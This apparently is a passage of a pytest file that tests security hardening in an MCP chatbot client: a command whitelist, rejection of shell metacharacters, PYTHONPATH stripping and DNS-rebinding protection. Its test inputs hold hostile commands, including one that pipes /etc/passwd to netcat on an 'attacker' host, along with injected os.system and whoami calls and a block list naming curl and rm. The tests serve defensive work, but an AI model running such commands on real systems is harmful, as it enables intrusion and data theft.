        _validate_stdio_command("python")

    def test_allowed_command_python3(self):
        """Test that python3 is in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        _validate_stdio_command("python3")

    def test_allowed_command_node(self):
        """Test that node is in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        _validate_stdio_command("node")

    def test_allowed_command_uvx(self):
        """Test that uvx is in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        _validate_stdio_command("uvx")

    def test_blocked_command_bash(self):
        """Test that bash is not in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="not.*allowed"):
            _validate_stdio_command("bash")

    def test_blocked_command_curl(self):
        """Test that curl is not in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="not.*allowed"):
            _validate_stdio_command("curl")

    def test_blocked_command_rm(self):
        """Test that rm is not in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="not.*allowed"):
            _validate_stdio_command("rm")

    def test_shell_metachar_in_args_semicolon(self):
        """Test that semicolons in args are rejected."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="metacharacters"):
            _validate_stdio_command("python", ["-c", "import os; os.system('id')"])

    def test_shell_metachar_in_args_pipe(self):
        """Test that pipe characters in args are rejected."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="metacharacters"):
            _validate_stdio_command("python", ["-c", "cat /etc/passwd | nc attacker 1234"])

    def test_shell_metachar_in_args_backtick(self):
        """Test that backticks in args are rejected."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        with pytest.raises(ValueError, match="metacharacters"):
            _validate_stdio_command("python", ["-c", "`whoami`"])

    def test_clean_args_accepted(self):
        """Test that normal arguments pass validation."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

        _validate_stdio_command("python", ["-m", "mcp_server", "--host", "localhost"])

    def test_stdio_client_validates_command(self):
        """Test that StdioMCPClient validates command on init."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        with pytest.raises(ValueError, match="not.*allowed"):
            StdioMCPClient(command="bash")

    def test_stdio_client_validates_args(self):
        """Test that StdioMCPClient validates args on init."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        with pytest.raises(ValueError, match="metacharacters"):
            StdioMCPClient(command="python", args=["-c", "import os; os.system('id')"])


# =============================================================================
# Security Hardening Tests (PYTHONPATH removal + DNS rebinding protection)
# =============================================================================


@pytest.mark.unit
class TestStdioEnvWhitelistHardening:
    """PYTHONPATH must not leak into the MCP subprocess environment.

    PYTHONPATH allows arbitrary module injection that overrides stdlib imports.
    The whitelist must exclude it; callers needing custom paths use self.env.
    """

    @pytest.mark.asyncio
    async def test_pythonpath_not_forwarded_to_subprocess(self):
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python", timeout=1.0)

        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b'{"jsonrpc": "2.0", "id": 1, "result": {}}\n')

        rogue_pythonpath = "/tmp/attacker-modules"
        with patch.dict(os.environ, {"PYTHONPATH": rogue_pythonpath, "PATH": "/usr/bin"}, clear=False):
            with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_exec:
                mock_exec.return_value = mock_process
                await client.start()

                _, kwargs = mock_exec.call_args
                forwarded_env = kwargs["env"]
                assert "PYTHONPATH" not in forwarded_env, (
                    "PYTHONPATH must not inherit from caller — enables module-injection bypass"
                )

    @pytest.mark.asyncio
    async def test_pythonpath_via_explicit_env_still_works(self):
        """Callers can still pass PYTHONPATH explicitly via self.env."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python", env={"PYTHONPATH": "/opt/mcp-deps"}, timeout=1.0)

        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b'{"jsonrpc": "2.0", "id": 1, "result": {}}\n')

        with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_exec:
            mock_exec.return_value = mock_process
            await client.start()

            _, kwargs = mock_exec.call_args
            assert kwargs["env"]["PYTHONPATH"] == "/opt/mcp-deps"


@pytest.mark.unit
class TestDNSRebindingProtection:
    """The transport must reject hosts whose live DNS resolution diverges from
    the IP set captured at validation time."""

    def test_validate_url_returns_resolved_ips(self):
        from eq_chatbot_core.mcp.client import _validate_url

        ips = _validate_url("http://localhost:8000")
        assert isinstance(ips, frozenset)
        # localhost typically resolves to at least one of these
        assert ips & {"127.0.0.1", "::1"}, f"localhost should resolve to a loopback IP, got {ips}"

    def test_validate_url_rejects_unresolvable_in_strict_mode(self):
        """Strict mode (the MCP client default) must refuse an unresolvable
        hostname: allowing it would disable DNS-rebinding pinning entirely."""
        import socket

        from eq_chatbot_core.mcp.client import _validate_url

        with patch.object(socket, "getaddrinfo", side_effect=socket.gaierror("unresolvable")):
            with pytest.raises(ValueError, match="could not be resolved"):
                _validate_url("http://does-not-resolve.invalid.example")

    def test_validate_url_allows_unresolvable_in_lan_mode(self):
        """LAN mode allows an unresolvable host (only known to the on-prem
        resolver) but returns no pin, signalling pinning is unavailable."""
        import socket

        from eq_chatbot_core.utils.url_validation import validate_url

        with patch.object(socket, "getaddrinfo", side_effect=socket.gaierror("unresolvable")):
            ips = validate_url("http://on-prem.invalid.example", allow_private_ranges=True)
            assert ips == frozenset()

    def test_pinned_transport_rejects_rebinding(self):
        """Build the pinned transport, then patch DNS to return a different IP
        and confirm the transport raises ConnectError."""
        import socket
        import threading

        import httpx

        from eq_chatbot_core.mcp.client import _build_pinned_transport

        pinned_ips: dict[str, frozenset[str]] = {"target.example": frozenset({"203.0.113.5"})}
        lock = threading.Lock()
        transport = _build_pinned_transport(pinned_ips, lock)

        # Force getaddrinfo to return a rogue private IP — simulating rebinding
        rogue_addrinfo = [(2, 1, 6, "", ("169.254.169.254", 0))]
        request = httpx.Request("GET", "http://target.example/")

        with patch.object(socket, "getaddrinfo", return_value=rogue_addrinfo):
            with pytest.raises(httpx.ConnectError, match="DNS rebinding detected"):
                transport.handle_request(request)

    def test_pinned_transport_passes_when_resolution_matches(self):
        """If DNS resolution stays within the pinned set, the transport must
        delegate to the parent class (which would actually open the socket).
        We patch handle_request on the parent class to verify delegation."""
        import socket
        import threading

        import httpx

        from eq_chatbot_core.mcp.client import _build_pinned_transport

        pinned_ips: dict[str, frozenset[str]] = {"target.example": frozenset({"203.0.113.5"})}
        lock = threading.Lock()
        transport = _build_pinned_transport(pinned_ips, lock)

        good_addrinfo = [(2, 1, 6, "", ("203.0.113.5", 0))]
        request = httpx.Request("GET", "http://target.example/")
        sentinel_response = MagicMock(spec=httpx.Response)

        with patch.object(socket, "getaddrinfo", return_value=good_addrinfo):
            with patch.object(httpx.HTTPTransport, "handle_request", return_value=sentinel_response) as super_call:
                result = transport.handle_request(request)
                super_call.assert_called_once()
                assert result is sentinel_response

    def test_pinned_transport_skips_check_for_unpinned_hosts(self):
        """Hosts that were never pinned (e.g. unresolvable at validation time)
        must not be blocked by the transport."""
        import threading

        import httpx

        from eq_chatbot_core.mcp.client import _build_pinned_transport

        pinned_ips: dict[str, frozenset[str]] = {}  # no entries
        lock = threading.Lock()
        transport = _build_pinned_transport(pinned_ips, lock)

        request = httpx.Request("GET", "http://other.example/")
        sentinel_response = MagicMock(spec=httpx.Response)

        with patch.object(httpx.HTTPTransport, "handle_request", return_value=sentinel_response) as super_call:
            result = transport.handle_request(request)
            super_call.assert_called_once()
            assert result is sentinel_response

    def test_mcpclient_pins_base_url_on_init(self):
        """MCPClient.__init__ must populate _pinned_ips from the base_url."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            from eq_chatbot_core.mcp.client import MCPClient

            client = MCPClient(base_url="http://localhost:8000/sse")
            assert "localhost" in client._pinned_ips
            assert client._pinned_ips["localhost"] & {"127.0.0.1", "::1"}

    def test_mcpclient_pins_endpoint_from_sse_event(self):
        """When the server emits a redirect endpoint, its hostname must be
        added to _pinned_ips."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            from eq_chatbot_core.mcp.client import MCPClient

            client = MCPClient(base_url="http://localhost:8000/sse")
            client._handle_sse_event("endpoint", "http://127.0.0.1:8000/message")

            assert client._message_endpoint == "http://127.0.0.1:8000/message"
            assert "127.0.0.1" in client._pinned_ips
